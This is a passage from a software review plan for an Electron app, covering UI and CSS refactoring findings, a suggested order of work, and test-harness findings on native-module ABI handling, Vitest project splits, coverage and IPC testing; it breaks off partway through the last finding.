- **What:** add `focusOnOpen: boolean` to `LayoutPicker`, true only when opened by click, keyboard
  (`openNow`) or `requestPicker`. Remember `document.activeElement` on open and restore it on any
  close path.
- **Verification:** component `paneLayouts.test.tsx`: focus the composer, hover the split button
  until the picker opens, and assert the composer is still focused; leave, and assert the same.
- **Constraints:** keyboard arrows in the picker (LayoutPicker 79–97) keep working when opened by
  click.
- **Depends on:** none.

#### UI-29: Motion, colour-only state and document language

- **Category:** a11y
- **Severity:** low
- **Effort:** S
- **Evidence:** reduced motion is handled for the search spinner (styles.css 624–627) and status dots
  (716–725) only. Not covered: `.icon-button .spinner` (636, infinite), `.toolbar-button .spinner`
  (1435), `.spinner-dot` (2606, infinite breathe during theme generation) and `notification-in`
  (1894). The comment at 713–715 says the status-dot media query is "the one rule in the file that reads a
  media feature", which is stale because there are two. Under reduced motion, `running` and `idle` dots
  differ **only by colour** (694–709; the comment at 713 says so explicitly). That fails WCAG 1.4.1
  for colour-blind users with reduced motion on. `aria-label` covers screen readers but not sighted
  users. `index.html:2` `<html>` has no `lang`.
- **What:** one `@media (prefers-reduced-motion: reduce)` block covering all infinite animations
  (replace rotation with a static partial ring). Give `running` a shape cue that survives no-motion,
  e.g. a ring plus dot (`box-shadow: inset 0 0 0 var(--status-ring-width) var(--bg-panel)`), and
  update `ActivityLegend` to match. Add `<html lang="en">`.
- **Verification:** component `activeSection.test.tsx` (legend renders real dots), `uiPolish`;
  emulate reduced motion in a component test via `page.emulateMedia` if the harness allows it.
- **Constraints:** CLAUDE.md: the dots are "colour *and* motion", and the legend is the only place the
  vocabulary is explained, so any shape change must be reflected there.
- **Depends on:** none.

#### UI-30: styles.css: split into ordered partials, add a z-index scale, finish the token and control-layer rules

- **Category:** css
- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - Organisation: rules are in accretion order, not feature order. Sidebar rules sit at 459–890,
    1790–1850 (Active/Recent/Pinned headers), 2322–2370 (groups, worktree rows) and 2392–2440 (hover
    card, note mark). Import dialog rules sit at 1460–1500, 1740–1760, 2040–2060 and 2152. Settings sits at
    2060–2150 and 2505–2510. Session tabs sit at 990–1130 and 2331–2337. `no-descending-specificity` is
    disabled in `.stylelintrc.json`, which is what lets this ordering pass lint.
  - z-index: 12 literal values, no scale: 0/1/2/3/5/6/20/55/60/80/100/120/−1 (lines 393, 398–399,
    485, 496, 933, 979, 1370, 1450, 1876, 1998, 2266, 2296, 2392, 2507, 2646, 2650). The only rationale
    is one comment (1440–1446).
  - Token rule violations (CLAUDE.md: "No literal colours"): `rgb(0 0 0 / 28%)` ×3 (1071, 1680,
    1686, the lifted-chip shadow) and `rgb(0 0 0 / 85%)` (2267, lightbox backdrop). `#000` in a
    `mask-image` (1729) is an alpha mask and acceptable.
  - Control layer: the base, hover, active, disabled and focus rules are selector *lists* of 7–8
    contexts (`.btn, .icon-button, .modal-actions button, .resume-bar button, .crash-actions button,
    .notification-action, .settings-preset, .composer-send`, e.g. 83–90, 250–256, 314–321), so dialog
    buttons are styled by where they sit, not by `.btn`. CLAUDE.md says new markup uses `.btn`.
    DeleteSessionDialog 18–19, ConflictDialog 23–25, NoteDialog 81–82, Settings footer 802–803,
    ErrorBoundary 60–61 (`className="primary"`) and Transcript 288–290 still depend on the context.
  - Dead CSS: 2 of 282 classes are unreferenced: `.field` (1490–1491) and `.btn.quiet` (300–301).
    ClassNames with no rule (hooks only, harmless): `flat-results`, `pending-row`, `pending-stop`,
    `recent-dismiss`, `search-cap-note`, `split-session-button`, `window-layout-button`,
    `branch-switcher-row-name`.
  - `!important`: 3, all justified (541–542 drag cursors; 1344 xterm viewport transparent per
    CLAUDE.md "The host paints the terminal's colour").
- **What:**
  1. Keep `styles.css` as the single entry (main.tsx 7 and `tests/component/renderApp.tsx` import it
     by path), changed to `@import`s of ordered partials:
     `styles/00-tokens.css` (:root, font attributes) → `01-base.css` → `02-controls.css` (control
     layer, checkboxes, scrollbars, focus ring) → `10-shell.css` (app-shell, layout grid, update
     banner, resizers) → `20-sidebar.css` → `30-panes.css` (content grid, tabs, header) →
     `31-transcript.css` → `32-terminal.css` (terminal host, shell card, toolbar, terminal list) →
     `40-overlays.css` (modal, context/git menu, hover card, layout picker, lightbox, notifications) →
     `50-dialogs.css` (import, settings, branch switcher, note) → `60-themes.css` →
     `90-glass.css` (the `html[data-material="glass"]` block, last on purpose because it overrides).
  2. z-index tokens in 00-tokens: `--z-base:1; --z-resizer:6; --z-pane-drop:20; --z-effects-front:55;
     --z-popover:60; --z-modal:80; --z-toast:100; --z-lightbox:120`, and replace every literal.
  3. Add `--shadow-chip: 0 1px 3px rgb(0 0 0 / 28%)` and `--bg-lightbox: rgb(0 0 0 / 85%)` to the
     token block (and to `ALL_THEME_VARS`/the spec allowlist only if themes should control them; they
     are not themable today).
  4. Add `className="btn"` / `"btn primary"` / `"btn danger"` to the remaining dialog buttons, then
     delete `.modal-actions button`, `.crash-actions button` and `.resume-bar button` from the
     selector lists.
  5. Delete `.field`, and delete `.btn.quiet` unless it is planned.
  6. Re-enable `no-descending-specificity` per partial once split (it will flag real order bugs).
  **CSS modules: not recommended.** The theme contract is global attribute selectors on `<html>`
  (`data-material`, `data-ui-font`) that reach into every component (e.g. `html[data-material="glass"]
  :is(.sidebar-frame, .sidebar-rail, .session-card, .shell-card)::before`, 2640–2650). `useHoverCard`
  queries `.hover-card, .layout-picker` (219) and `safeWithin: '.session-row-wrap'` (LayoutMenuButton
  34). Tests locate elements by `data-testid`, but some CSS behaviour depends on stable class names.
  Hashing would break these for no gain, since the file has almost no dead code or collisions. Per-feature
  partials give the organisational benefit without changing a single selector.
- **Why:** finding every rule for one component today means reading about 4 locations. The z-index
  "load-bearing" ordering is implicit.
- **Gain:** one file per feature, an explicit stacking scale, and a control layer that matches the
  documented convention.
- **Implementation steps:** do the split as a pure move and prove it: concatenating the partials in
  import order must be **byte-identical** to the old file minus the moved comments (run
  `cat styles/*.css | diff - old-styles.css`). Then apply 2–6 as separate commits.
- **Verification:** `npm run lint` (stylelint, including the radius rule), `npm run test:component`
  (`lookAndFeel`, `uiPolish`, `themes`: real stylesheet, real layout), e2e `lookAndFeel.spec.ts`,
  `uiPolish.spec.ts`, `npm run screenshot` visual diff, and bench `themePerf.spec.ts` for the glass
  partial.
- **Constraints:** no literal radius above 3px (stylelint rule); no `backdrop-filter`; tokens for
  colour *and* shape; the scrollbar data-URI exception.
- **Depends on:** none.

#### UI-31: Feature-oriented file layout

**Lead review:** Canonical for the renderer layout (supersedes STRUCT-3). Do it after UI-19, UI-20 and UI-21.

- **Category:** structure
- **Severity:** low
- **Effort:** M (mechanical; one PR per folder)
- **Evidence:** `components/` is flat with 44 files mixing dialogs, hooks (`useHoverCard.ts`,
  `useMrStatuses.ts`), pure helpers (`mrRefText.tsx`, `pluginBar.tsx`'s `pluginButtons`), icons and
  feature components. `state/` mixes pure models, React hooks and a provider (`notifications.tsx`).
- **What:** target layout (moves only; update imports; keep file names):

  | Current | New |
  | --- | --- |
  | App.tsx | app/App.tsx (+ app/providers.tsx) |
  | main.tsx, index.html, fonts.ts, scrollMarks.ts, errors.ts | unchanged at root (entry, side-effect modules) → errors.ts to ui/errors.ts |
  | components/Sidebar.tsx, SessionTree.tsx, SessionRow.tsx, SearchField.tsx, ActivityLegend.tsx, mrRefText.tsx, useMrStatuses.ts | features/sidebar/… (useMrStatuses → features/sidebar/useMrStatuses.ts or state/mrStatusStore.ts per UI-10) |
  | components/SessionColumn.tsx, SessionTabBar.tsx, EditableSessionTitle.tsx, ResumeBar.tsx, Toolbar.tsx, pluginBar.tsx, PaneFiller.tsx | features/pane/… |
  | components/Transcript.tsx, MessageRow.tsx, MarkdownText.tsx, ToolBlock.tsx, TranscriptImage.tsx, ImageLightbox.tsx, Composer.tsx | features/transcript/… |
  | components/TerminalView.tsx, TerminalListPanel.tsx, state/terminalPaste.ts | features/terminal/… |
  | components/BranchSwitcher.tsx, GitMenu.tsx, WorktreeConflictDialog.tsx, state/branchSelection.ts | features/git/… |
  | components/LayoutPicker.tsx, LayoutMenuButton.tsx, PaneDividers.tsx, state/layout.ts, state/columns.ts, state/layoutContext.ts | features/layout/… |
  | components/SettingsDialog.tsx | features/settings/… (UI-20) |
  | components/ThemesSection.tsx, theme/* | features/themes/… (applyTheme, ThemeEffects, useTheme) |
  | components/UpdateBanner.tsx, state/useUpdate.ts, state/updateSummary.ts | features/update/… |
  | components/ImportDialog.tsx, DeleteSessionDialog.tsx, MoveSessionDialog.tsx, NoteDialog.tsx, ConflictDialog.tsx | features/dialogs/… |
  | components/ErrorBoundary.tsx, NotificationCenter.tsx, ContextMenu.tsx, HoverCard.tsx, useHoverCard.ts, icons.tsx | ui/… (primitives; + ui/Modal.tsx, ui/Menu.tsx, ui/useEscape.ts, ui/useResizeDrag.ts) |
  | state/notifications.tsx | ui/notifications.tsx |
  | state/uiState.ts, recentSessions.ts, groups.ts, allWorktrees.ts, useAllWorktrees.ts, refreshSummary.ts | features/sidebar/model/… (uiState.ts stays in state/) |
  | state/useTree.ts, useSessionTreeCache.ts, useActiveTabs.ts, usePtySessions.ts | state/ (external-data stores; UI-3/UI-10) |
  | state/useDebouncedValue.ts | delete (UI-18) |

- **Why:** a feature change today touches 3 directories without any signal of what belongs together.
  The flat folder has also let helpers drift into component files (UI-18).
- **Gain:** colocation; ESLint area blocks can later forbid cross-feature deep imports (e.g.
  `features/*` may import `ui/*` and `state/*`, not other features' internals).
- **Implementation steps:** one folder per PR with `git mv` (history is preserved); update the imports
  in `tests/component` and `tests/unit` that reach into `src/renderer` (e.g.
  `tests/unit/branchSelection.test.ts` imports `src/renderer/state/branchSelection`). Do it after UI-19
  to UI-21, so the split files land directly in their new homes.
- **Verification:** `npm run typecheck`, `npm run lint`, `npm test`, `npm run test:component`,
  `npm run test:e2e:smoke`.
- **Constraints:** `tests/component/renderApp.tsx` imports `App`, `NotificationProvider`,
  `NotificationCenter`, `ErrorBoundary`, `applyTheme`, `fonts`, `styles.css` and `scrollMarks` by
  path, so update it in the same PR. The ESLint renderer area block must still cover the new paths.
- **Depends on:** best after UI-19, UI-20, UI-21.

#### UI-32: Inline SVG duplication

- **Category:** modularity
- **Severity:** low
- **Effort:** S
- **Evidence:** 15 inline `<svg>` outside `icons.tsx`. The chevron path `M6 4l4 4-4 4` appears 8
  times (Sidebar 669/720/898, SessionTree 269, SessionColumn 612, ToolBlock 31, GitMenu 110, plus
  one more). `EditableSessionTitle.tsx 67–72` inlines a pencil although `icons.tsx 123` exports
  `PencilIcon`. The plus in SessionTree 298–300 duplicates `PlusIcon`. `ContextMenu` 107 inlines a
  check duplicating `CheckIcon`.
- **What:** add `ChevronIcon({ expanded })` rendering `className="chevron" data-expanded`, and use
  the existing icons.
- **Verification:** component `uiPolish` (chevron rotation), `transcript` (chevron position test).
- **Constraints:** keep the `chevron` class and `data-expanded` attribute, which CSS rotates on.
- **Depends on:** none.

#### UI-33: xterm renderer: evaluate the WebGL addon for the visible terminal only

- **Category:** performance
- **Severity:** low
- **Effort:** M
- **Evidence:** `TerminalView.tsx 83–95` uses the default DOM renderer with `allowTransparency:
  true`. No `@xterm/addon-webgl` is in package.json. All terminals of all tabs stay mounted, hidden
  (SessionColumn 560–578, 705–738). Lifecycle is otherwise correct: dispose, observer disconnect, rAF
  cancel and listener removal all happen on unmount (279–290); ResizeObserver work is rAF-coalesced and
  change-gated (236–261).
- **What:** only if `themePerf.spec.ts` "terminal typing" or a heavy-output test shows the DOM renderer
  on the critical path: load `WebglAddon` when a terminal becomes `visible`, dispose it when hidden
  (Chromium caps live WebGL contexts at about 16, and hidden terminals must not hold one), and fall back
  to DOM on `onContextLoss`.
- **Verification:** bench with and without GPU (`APIARY_BENCH_GPU=off`); component `terminal`,
  `multiTerminal`; e2e `terminal.spec.ts`.
- **Constraints:** the snapshot → parse → fit → resize order (CLAUDE.md) must not change; glass needs
  transparency; measure before adopting (CLAUDE.md "Measure before fixing").
- **Depends on:** none.

---

### Verified OK / keep as is

- **Layout model** (`state/layout.ts`): preset table plus `tidyLayout`, pure and unit-tested; the
  single-atomic `windowState` for layout plus focus (App 155–210) is the right fix for the documented
  ordering bug. Keep it.
- **Search path:** `SearchField` owns the typed text and publishes a debounced query (150 ms);
  `useDeferredValue` in Sidebar; `filterTreeLocal` memoised on the settled query (useTree.ts 83–86);
  `rankSessions` keyed on `settledQuery` (Sidebar 331–341); content search guarded by a request id
  (useTree 44–71). Correct and well reasoned.
- **Markdown:** parsed once per text via `useMemo` and always DOMPurify-sanitised (MarkdownText.tsx
  18–21).
- **TerminalView lifecycle:** dispose, observer disconnect, rAF cancel and listener cleanup;
  snapshot, then drain the queue, then fit (97–165); `attachCustomKeyEventHandler` for copy and paste;
  a single paste path via `terminalPaste.ts`.
- **Transcript race handling:** `generationRef` covers A→B→A revisits (Transcript 78–90);
  `loadingEarlierRef` synchronous guard; deferred scroll while hidden (152–191).
- **ThemeEffects:** 30/15 fps cap, pause when hidden or blurred for 30 s, still frame under reduced
  motion, freeze during drags, full listener cleanup (ThemeEffects.tsx 104–146).
- **Polling hygiene:** the git status poll skips while unfocused (SessionColumn 171–177); `useUpdate`,
  `usePtySessions` and `useActiveTabs` are push-driven, not timers; `useMrStatuses` clears its interval.
  The only renderer `setInterval`s are those two.
- **Error surfaces:** `errors.ts`' `describeError` (prefix stripping, fs-code rewriting, headline
  capping); the notification provider as a window-level net with dedupe; errors pinned until
  dismissed; `role="alert"` for errors and `aria-live` on the stack.
- **CSS hygiene:** 2 dead classes out of 282; 3 `!important`s, all justified; no `backdrop-filter`
  anywhere; radius rule enforced by stylelint; one `--focus-ring` token used consistently; the
  tab and terminal-list focus rings are keyboard-only by design.
- **Keyboard wins:** LayoutPicker grid arrows; TerminalListPanel roving focus plus F2; the Active header
  is focusable to reach the legend (Sidebar 597–607); status dots carry `role="img"` plus `aria-label`.
- **Popups escape clipping** by portal plus fixed positioning with viewport clamping (ContextMenu,
  HoverCard, LayoutPicker, GitMenu).
- `npm run typecheck` passes.

---

### Suggested order of work

1. **Bugs first (S each, independent):** UI-12 (Composer key), UI-13 step 2 (ThemesSection Escape),
   UI-14 (stale git/plugin responses), UI-28 (picker focus theft), UI-23 (catches, VS Code probe).
2. **Cheap performance wins:** UI-5 (context splits), UI-4 steps 1 and 3 (activeTabs equality,
   `memo(MessageRow)`), UI-7 (hover-card scroll registry), UI-8, UI-11, UI-6 (debounce
   `saveUiState` first). Measure before and after with `themePerf.spec.ts` and the React Profiler.
3. **State foundation:** UI-3 (tree store), UI-17 (pty id helpers), UI-2 (workspace reducer with
   unit tests), UI-18 (dead code, walkers, purity).
4. **Decomposition:** UI-1 (App hooks and providers), then UI-21 (SessionColumn), UI-19 (Sidebar),
   UI-20 (Settings registry), UI-16 (BranchSwitcher), UI-22 (Themes). Finish UI-4 (memo the rows) once
   props are stable.
5. **Primitives and accessibility:** UI-13 (useEscape), UI-25 (Modal), UI-26 (tabs, menus, hover card),
   UI-24 (boundaries), UI-29, then UI-27 (tree keyboard, the largest).
6. **Housekeeping:** UI-30 (CSS partials, z-scale, tokens, control layer), UI-32 (icons), UI-31
   (feature folders, last so moves happen once), UI-9 and UI-33 only if measurements after step 2 still
   call for them.

After every step: `npm run typecheck && npm run lint && npm run test:component`, plus the e2e specs
named in the finding. Never run `npm test` and `npm run test:e2e` at the same time (the ABI trap in
CLAUDE.md).

## Part D: Testability, test harness, tooling and CI

Reviewer area: tests/**, vitest/playwright/electron-vite/tsconfig/eslint configs, package.json scripts
and dependency versions, electron-builder.yml, scripts/*, .husky/*, .github/workflows/*.
Everything here was read or run read-only. Commands used: `npm run typecheck`, `npm run lint`,
`npx tsc --noEmit` with extra flags, `npx eslint --rule … -f json`, `npm outdated`, `npm ls`,
`npx madge --circular`, `npm run test:component`, and a one-line `node -e "require(...)"` probe
of the native modules. No `npm test`, e2e, build or rebuild was run. Two helper scripts
(`covmap.mjs`, `native.mjs`) are in the scratchpad.

---

### Current state

#### Test counts per layer

| Layer | Files | Tests | Time | Notes |
| --- | --- | --- | --- | --- |
| Unit (Vitest, Node) | 58 | 493 `it(`/`test(` call sites; more at runtime because of `it.each` | ~10 s (proposal doc) | 2 files run real git (`branchOps`, `worktreeResolver`) |
| Integration (Vitest, Node) | 9 | 213 call sites | ~12 s, `fileParallelism: false` | only 4 files load a native module (see TEST-2) |
| Component (Vitest browser mode, Chromium) | 35 | **187 passed, 19.84 s** (measured) | | 36 tests print an xterm `TypeError … 'dimensions'` to stderr (TEST-14) |
| E2E (Playwright + Electron) | 42 specs | **140** + 13 opt-in (`live/` 2 files, `bench/` 1 file) | ~3.2 min locally (proposal doc) | 12 `@smoke`, 11 `@serial` (counted by grep) |

The proposal doc gives 761 unit and integration tests at runtime. My grep counts call sites, so it
comes out lower.

#### What runs where

| Where | What |
| --- | --- |
| pre-commit | `npx lint-staged` (ESLint/Stylelint/markdownlint/shellcheck on staged files) |
| commit-msg | commitlint (conventional) plus a grep that rejects AI attribution |
| pre-push | `npm run typecheck && npm run lint`: typecheck measured at 3.7 s, lint at 12.7 s |
| CI (`ci.yml`, ubuntu-latest only, push to main and PRs) | job `lint`: typecheck and lint. Job `test`: `npm ci`, `npm test` (rebuilds for Node), `playwright install --with-deps chromium`, `test:component` |
| Release (`release.yml`, `v*` tag, macos-14 and ubuntu-24.04) | typecheck, lint, `npm test`, `dist:*`, upload. **No component tests, no e2e** |
| Nowhere automated | the whole E2E suite, `@smoke` included. The packaged app is never launched by anything |

#### Native ABI state right now

`node -e "new (require('better-sqlite3'))(':memory:')"` fails with `compiled against … NODE_MODULE_VERSION 139`,
so node_modules is currently in the Electron 38 ABI. A bare `npx vitest run` in this checkout would
fail right now. **`node-pty` loads fine under Node 22 even so**: node-pty 1.1.0 depends on
`node-addon-api ^7.1.0`, which is N-API and ABI-stable. So **better-sqlite3 is the only module that
actually needs the ABI dance.** This changes how big the problem is (TEST-1, TEST-2).

#### Coverage measurement

None. There is no `@vitest/coverage-*` in node_modules/@vitest, no `coverage` key in either Vitest
config, and `coverage/` is not in `.gitignore`. ESLint does ignore `coverage/` (eslint.config.js:25).

---

### Coverage-gap table

Computed by resolving every relative and `@shared` import from tests/** into src, then taking the
transitive closure through non-type imports (`scratchpad/covmap.mjs`).

#### A. src files with no test at any Node or component layer (direct or transitive)

| File | Lines | Only covered by | Risk |
| --- | --- | --- | --- |
| src/main/ipc.ts | 698 | e2e | **High.** Holds the "missing field = unchanged" settings merge (ipc.ts:249-280) that CLAUDE.md calls an afternoon-long bug. Also every `treeChanged` emission and the activity broadcast throttle |
| src/main/index.ts | 598 | e2e | Medium. Window lifecycle, `createUpdater` with the inline fake backend (index.ts:319-386), and startup wiring |
| src/preload/index.ts | 126 | e2e | Medium. 85 `ipcRenderer` calls. Nothing checks that each channel has a main-side handler |
| src/main/menu.ts | 107 | e2e | Low |
| src/main/theme/themeIpc.ts | 89 | e2e | Medium. It wires theme validation to IPC |
| src/main/search/searchWorker.ts | 38 | e2e (unpackaged only) | Medium. Under Vitest the worker never starts (TEST-7) |
| src/main/update/macSignature.ts | 30 | nothing (real codesign, packaged mac only) | Low |
| src/main/log/configure.ts | 27 | e2e | Low |
| src/renderer/main.tsx | 27 | component harness duplicates it (renderApp.tsx) | Low |
| src/renderer/state/useDebouncedValue.ts | 13 | **nothing, and nothing imports it** (dead code) | Low: delete it |

#### B. Covered only indirectly (no direct test)

| File | How it is reached | Gap |
| --- | --- | --- |
| src/main/search/searchClient.ts | appService integration | Only the fallback path. `searchWorker.js` does not exist beside `src/main/search`, so `ensure()` always fails under Vitest |
| src/main/pty/childEnv.ts | ptyManager.test.ts:39-52 | Behaviour is asserted through a real pty. Acceptable |
| src/main/store/schema.ts | sessionStore tests | Acceptable |
| 40 renderer components and hooks | the whole-App mount in the component layer | By design (see proposal). Acceptable |

---

### Findings

#### TEST-1: Fix the native ABI trap structurally (better-sqlite3 `nativeBinding` cache plus a fail-fast guard)

- **Category:** harness
- **Severity:** high
- **Effort:** M
- **Evidence:**
  - package.json:17-26. `start`, `test`, `test:e2e`, `test:e2e:smoke`, `screenshot` and every `dist*` script run `rebuild:electron` (`electron-rebuild -f`, forced) or `rebuild:node` first.
  - CLAUDE.md:31-50 documents "20 failing tests that were nothing of the kind".
  - Probe: better-sqlite3 is at ABI 139 now, while node-pty (node-addon-api, N-API) loads under both runtimes.
  - better-sqlite3 11.10 supports `new Database(path, { nativeBinding })` (node_modules/better-sqlite3/lib/database.js:36-55).
  - Only two construction sites exist: src/main/store/sessionStore.ts:73 and src/main/search/searchIndex.ts:83.
  - Only 3 test files load better-sqlite3 transitively: appService, searchIndex and sessionStore in integration (`scratchpad/native.mjs`).
- **What:** Keep `node_modules` permanently in the **Electron** ABI, which is what the app, e2e, screenshot and dist all need. Give Vitest a separately cached **Node-ABI copy** of `better_sqlite3.node`, injected through `nativeBinding` from a test setup file. No production code changes. Add a fail-fast guard with a clear message. Options considered:

  | Option | Verdict |
  | --- | --- |
  | Two full `node_modules` trees (electron-rebuild into a separate dir) | Heavy: doubles install size and time, and needs a custom resolver. Unnecessary when only one `.node` file differs |
  | NODE_MODULE_VERSION guard alone | Cheap and worth doing, but it only turns a confusing failure into a clear one. It does not stop a rebuild from landing under a running suite |
  | Lockfile against concurrent runs | Treats the symptom. Nothing should rebuild at test time at all |
  | Run Vitest under Electron as Node (`ELECTRON_RUN_AS_NODE=1 electron node_modules/vitest/vitest.mjs run`) | One ABI for everything and plausible. But the variable is inherited by every git, pty and shell child the integration tests spawn. CLAUDE.md:52-58 documents it poisoning later Playwright launches and it breaks Electron-based CLIs like `code`. It also slows worker start-up and is not a supported Vitest runtime. Second choice |
  | **Cached Node-ABI `better_sqlite3.node` plus `nativeBinding` in a Vitest setup file (recommended)** | Rebuilds nothing at test time, lets tests and the app share one node_modules, and needs no production code change |

- **Why:** Every entry point rebuilds today, so running things in the wrong order or at the same time poisons a suite with failures that look like real bugs. The forced `-f` also rebuilds every time even when nothing changed.
- **Gain:** `npm test`, `test:e2e` and `start` can run in any order and at the same time. `npm test` gets faster with no rebuild. The trap section of CLAUDE.md shrinks to one paragraph.
- **Implementation steps:**
  1. Add `scripts/native-node-cache.mjs`. It copies `node_modules/better-sqlite3` to a temp dir, runs `npx prebuild-install --runtime node --target <process.versions.node>` there (better-sqlite3 already depends on prebuild-install), falls back to `npx node-gyp rebuild`, and writes the result to `node_modules/.cache/apiary-native/node-abi<process.versions.modules>/better_sqlite3.node`.
  2. In `package.json`: `"postinstall": "node scripts/fix-node-pty-permissions.mjs && node scripts/native-node-cache.mjs && electron-rebuild -w better-sqlite3"`. node-pty is N-API, so drop it from the rebuild list, or keep it without `-f`.
  3. Add `tests/support/sqliteNodeBinding.ts` and list it first in `setupFiles` of the Node Vitest config:

     ```ts
     import { vi } from 'vitest'
     import { createRequire } from 'node:module'
     import { existsSync } from 'node:fs'
     import { resolve } from 'node:path'
     const binding = resolve(`node_modules/.cache/apiary-native/node-abi${process.versions.modules}/better_sqlite3.node`)
     if (!existsSync(binding)) throw new Error(`No Node-ABI better-sqlite3 at ${binding}. Run: node scripts/native-node-cache.mjs`)
     vi.mock('better-sqlite3', () => {
       const Real = createRequire(import.meta.url)('better-sqlite3')
       function Database(file: string, opts: Record<string, unknown> = {}) { return new Real(file, { nativeBinding: binding, ...opts }) }
       Database.prototype = Real.prototype
       return { default: Database }
     })
     ```

  4. Add `globalSetup: 'tests/support/abiGuard.ts'`. It opens `:memory:` with that binding and, on `NODE_MODULE_VERSION`, fails with one line naming the fix.
  5. Change scripts: `"test": "vitest run"`. Drop `rebuild:electron` from `test:e2e`, `test:e2e:smoke`, `screenshot` and `start`, or replace it with a cheap check (`electron -e` loading better-sqlite3) that rebuilds only on mismatch. Keep `rebuild:electron` as a manual escape hatch.
  6. Add `.nvmrc` (`22`) so the cache key stays stable across machines.
  7. Rewrite the "native-module ABI trap" section of CLAUDE.md, and the `npm test` comments in ci.yml and release.yml.
- **Verification:** Run `npm run test:e2e:smoke` and then `npm test` with no rebuild in between: both pass. Start them concurrently: both pass. Delete the cache: `npm test` fails in under 1 s with the guard message.
- **Constraints:** Tests stay out of hooks unless TEST-2 makes the unit project native-free. electron-builder's own `npmRebuild` still produces the packaged binaries. CLAUDE.md's `ELECTRON_RUN_AS_NODE` warning stays.
- **Depends on:** none. It pairs with TEST-2.

#### TEST-2: Split Vitest into `unit` (parallel, native-free) and `integration` (serial) projects, and put `unit` in pre-push

- **Category:** harness / organisation
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - vitest.config.ts:9-16 applies `fileParallelism: false` to all 67 files. The reason given is real git and pty contention, and it names "worktreeResolver, ptyManager, branchOps, appService". Two of those (`branchOps`, `worktreeResolver`) live in tests/unit.
  - `native.mjs`: only 4 files load a native module (appService: better-sqlite3 and node-pty; ptyManager: node-pty; searchIndex and sessionStore: better-sqlite3).
  - Meanwhile integration/updateService.test.ts, themeStore.test.ts and logger.test.ts are pure or filesystem-only.
  - .husky/pre-push:3 leaves tests out only because of the rebuild.
- **What:** A workspace or `projects` config with a clear boundary rule: **integration = spawns a process or loads a native module; unit = everything else.**

  ```ts
  // vitest.config.ts (Vitest 2: vitest.workspace.ts; Vitest 3.2+: test.projects)
  export default defineWorkspace([
    { extends: './vitest.config.ts', test: { name: 'unit', include: ['tests/unit/**/*.test.ts'], fileParallelism: true } },
    { extends: './vitest.config.ts', test: { name: 'integration', include: ['tests/integration/**/*.test.ts'], fileParallelism: false } },
  ])
  ```

  Move `branchOps.test.ts` and `worktreeResolver.test.ts` to integration. Optionally move `updateService.test.ts` and `themeStore.test.ts` to unit.
- **Why:** Unit files are serialised for no reason. The native-free majority cannot run anywhere without the ABI dance, so no test runs before a push.
- **Gain:** Faster unit runs. `vitest run --project unit` becomes safe for pre-push. The layering in CLAUDE.md gets a rule that can be checked.
- **Implementation steps:**
  1. Create the workspace as above. `npm test` runs both projects. Add `test:unit` and `test:integration` scripts.
  2. Move the two git-driving files. Update the comment in vitest.config.ts.
  3. Add a guard unit test: fail if any tests/unit file imports `better-sqlite3`, `node-pty`, `node:child_process`, `AppService` or `PtyManager` (a grep over the file text is enough).
  4. Append `&& npx vitest run --project unit` to .husky/pre-push.
- **Verification:** `vitest run --project unit` passes with node_modules in the Electron ABI. It is faster than today's serial pass (compare wall times).
- **Constraints:** Integration stays serial (the proposal doc keeps it serial on purpose). CLAUDE.md "Linting and hooks" must be updated.
- **Depends on:** TEST-1 is optional. The unit project needs no natives either way.

#### TEST-3: Add v8 coverage for the Node and component runs, reported and not yet gating

- **Category:** coverage
- **Severity:** medium
- **Effort:** S
- **Evidence:** No coverage provider is installed (`ls node_modules/@vitest` shows no coverage-v8). There is no coverage config in vitest.config.ts or vitest.component.config.ts. `coverage/` is missing from .gitignore. The gap table above had to be derived by hand from imports.
- **What:** Install `@vitest/coverage-v8@2.1.9`, pinned to the vitest version. Configure it as below. Browser mode supports v8 coverage with the Playwright provider on Chromium.

  ```ts
  // vitest.config.ts
  coverage: {
    provider: 'v8', reportsDirectory: 'coverage/node',
    include: ['src/main/**', 'src/shared/**', 'src/renderer/state/**'],
    exclude: ['src/main/index.ts', 'src/main/menu.ts'],
    reporter: ['text-summary', 'json-summary', 'html', 'lcov'],
  },
  // vitest.component.config.ts
  coverage: { provider: 'v8', reportsDirectory: 'coverage/component', include: ['src/renderer/**', 'src/shared/**'],
    reporter: ['text-summary', 'json-summary', 'html'] },
  ```

  Scripts: `"test:coverage": "vitest run --coverage"` and `"test:component:coverage": "vitest run -c vitest.component.config.ts --coverage"`.
- **Why:** There is no objective view of what the fast layers miss. The biggest gaps (ipc.ts, the preload channel map) were only visible by tracing imports.
- **Gain:** A report per CI run. A floor can be set later, per directory.
- **Implementation steps:**
  1. Add the dev dependency and the config above. Add `coverage/` to .gitignore.
  2. In ci.yml, run the coverage variants. Append `coverage/*/coverage-summary.json` totals to `$GITHUB_STEP_SUMMARY`, and upload `coverage/` as an artifact.
  3. Phase 1 has no thresholds. After 2-3 runs, set `thresholds` at (measured - 2 points) per glob, for example `'src/shared/**': { lines: 90 }` and `'src/main/**': { lines: <measured-2> }`. Leave `autoUpdate` off so drops are deliberate.
- **Verification:** A CI run shows the summary table and an HTML artifact. A later PR that deletes a test lowers the number visibly.
- **Constraints:** Component coverage must not change the fonts or the stylesheet the harness loads.
- **Depends on:** TEST-2, for per-project reports.

#### TEST-4: Bring ipc.ts under test: extract the settings merge, and add a preload-to-main channel parity test with a mocked `electron`

**Lead review:** Step 1 is a prerequisite for MAIN-16 steps 2-5.

- **Category:** seams / coverage
- **Severity:** high
- **Effort:** M
- **Evidence:**
  - ipc.ts:249-280 holds the `keep()` merge. CLAUDE.md "Settings arriving over IPC" says getting it wrong cost an afternoon.
  - integration/appService.test.ts:998-1044 covers only the AppService side (`setSearchSessionNotes(undefined)`), not the merge.
  - `registerIpc` takes 11 positional parameters (ipc.ts:34-56) and registers on the global `ipcMain`.
  - The preload (src/preload/index.ts) makes 85 `ipcRenderer` calls with no check that a handler exists for each.
  - Precedent for mocking `electron`: tests/unit/electronUpdaterBackend.test.ts:15.
- **What:**
  1. Move the merge into `src/main/settings.ts` as `mergeSettingsPayload(current: AppSettings, next: Partial<AppSettingsPayload>): AppSettings`, and unit-test it. Every key missing leaves settings unchanged. An explicit `false` sticks. `claudeBin: null` sticks. `recentSectionHours` is clamped.
  2. Add a `tests/integration/ipcWiring.test.ts` that uses `vi.mock('electron', …)`, providing `ipcMain.handle/on/removeHandler` into a Map, `BrowserWindow.getAllWindows()` returning one fake window that records `webContents.send`, and stub `clipboard/app/shell`. It calls `registerIpc(realAppService, …)` and asserts:
